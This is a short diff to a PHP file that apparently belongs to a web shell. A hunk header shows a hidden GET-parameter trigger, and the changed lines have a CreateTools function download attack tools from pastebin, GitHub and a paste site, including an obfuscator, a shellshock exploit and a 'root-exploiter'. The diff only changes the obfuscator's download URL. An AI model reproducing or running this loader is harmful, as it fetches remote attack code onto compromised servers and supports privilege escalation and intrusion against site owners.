@@ -490,7 +490,7 @@ if ($_GET['make_love'] == $names) {
 #CreateTools("tokenpp","http://pastebin.com/raw/72xgmtPL");
 #CreateTools("extractor","http://pastebin.com/raw/jQnMFHBL");
 #CreateTools("webdav","https://pastebin.com/raw/8szajjXK");
-CreateTools("obfuscator", "https://pst.innomi.net/paste/thafup3so3rkqywjd6f7492b/raw");
+CreateTools("obfuscator", "https://raw.githubusercontent.com/mrxbarakuda/paste/refs/heads/main/obfuscator.txt");
 CreateTools("shellshock", "https://pastebin.com/raw/ZB3DLXwR");
 CreateTools("rootex", "https://raw.githubusercontent.com/mukarramkhalid/root-exploiter-php-cpp/master/root-c.php");
 CreateTools("lokmed", "https://pastebin.com/raw/0STXanAx");
